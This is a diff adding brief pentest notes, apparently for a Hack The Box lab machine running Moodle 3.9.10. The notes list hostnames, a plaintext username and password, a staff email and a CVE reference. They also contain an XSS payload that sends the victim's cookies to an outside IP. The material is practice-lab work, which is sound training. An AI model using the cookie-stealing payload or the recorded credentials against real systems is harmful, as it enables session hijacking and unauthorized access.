@@ -1,0 +1,12 @@
+admissions@schooled.htb
+moodle.schooled.htb
+
+nich:!QAZ2wsx
+
+moodle 3.9.10
+
+phillips_manuel@staff.schooled.htb
+
+xss
+<img src=x onerror=this.src="http://10.10.14.28/?c="+document.cookie>
+cve 2020 14321
